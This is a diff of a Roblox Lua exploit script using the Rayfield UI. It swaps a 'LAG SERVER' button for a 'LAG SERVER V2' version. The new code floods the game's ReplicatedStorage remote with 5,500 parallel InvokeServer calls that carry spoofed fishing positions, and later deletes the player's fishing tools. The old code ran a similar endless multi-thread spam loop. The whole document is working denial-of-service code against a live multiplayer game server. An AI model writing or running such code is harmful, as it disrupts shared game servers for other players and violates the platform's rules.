@@ -2095,78 +2095,59 @@ Tab:CreateToggle({
     end
 })
 
-
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local backpack = player:WaitForChild("Backpack")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace = game:GetService("Workspace")
-local Toggle = false 
-local lagrods = false 
-
-local function skrunkle3366()
-    for _, tool in pairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            tool.Parent = character 
-        end
-    end
-end
-
-local function bloop9998()
-    ReplicatedStorage.Connection:InvokeServer(9, 0)
-    wait(0.1)
-
-    ReplicatedStorage.Connection:InvokeServer(9, 1)
-
-    ReplicatedStorage.Connection:InvokeServer(49)
-    ReplicatedStorage.Connection:InvokeServer(50)
-    ReplicatedStorage.Connection:InvokeServer(51)
-
-    local ohNumber1 = 11
-    local ohTable2 = {
-        ["FishingPolePos"] = Workspace.TempFish.Position,
-        ["Power"] = math.random(), 
-        ["Face"] = Workspace.TempFish.Position,
-        ["PlayerPos"] = Workspace.TempFish.Position,
-        ["FishingZonePos"] = Vector3.new(-5.29345703, -18.0412292, 43.7173767),
-    }
-    ReplicatedStorage.Connection:InvokeServer(ohNumber1, ohTable2)
-end
-
-
-local function chonk6643()
-    while Toggle do
-        
-        for _ = 1, 1000 do
-            spawn(function() 
-                skrunkle3366()
-            end)
-
-            spawn(function()
-                bloop9998()
-            end)
-        end
-        wait(0) 
-    end
-end
-
 local Button = Tab:CreateButton({
-   Name = "LAG SERVER",
+   Name = "LAG SERVER V2",
    Callback = function()
- 
-        
-        lagrods = true
-        spawn(function()
-            while lagrods do
-                
-                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
-                wait(1) 
-            end
-        end)
+ Rayfield:Notify({
+                Title = "Zynlope",
+                Content = "Please wait till everything loads to lag the server. This takes around 30 seconds to a minute.",
+                Duration = 10,
+            })
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Workspace = game:GetService("Workspace")
+    local Players = game:GetService("Players")
 
-        
-        Toggle = true
-        chonk6643() 
+    local function bloop9998()
+        ReplicatedStorage.Connection:InvokeServer(9, 0)
+        wait(0.1)
+
+        ReplicatedStorage.Connection:InvokeServer(9, 1)
+
+        ReplicatedStorage.Connection:InvokeServer(49)
+        ReplicatedStorage.Connection:InvokeServer(50)
+        ReplicatedStorage.Connection:InvokeServer(51)
+
+        local position = Workspace.TempFish.Position
+        local ohNumber1 = 11
+        local ohTable2 = {
+            ["FishingPolePos"] = position,
+            ["Power"] = math.random(),
+            ["Face"] = position,
+            ["PlayerPos"] = position,
+            ["FishingZonePos"] = Vector3.new(-5.29345703, -18.0412292, 43.7173767),
+        }
+
+        ReplicatedStorage.Connection:InvokeServer(ohNumber1, ohTable2)
+    end
+
+    local function zorp7857(id)
+        bloop9998()
+    end
+
+    for id = 1, 5500 do
+        task.spawn(zorp7857, id)
+    end
+
+    task.delay(35, function()
+        local character = Players.LocalPlayer.Character
+        if character then
+            for _, tool in ipairs(character:GetChildren()) do
+                if tool:IsA("Tool") and tool.Name:find("Fishing") then
+                    tool:Destroy()
+                end
+            end
+        end
+    end)
    end,
 })
 
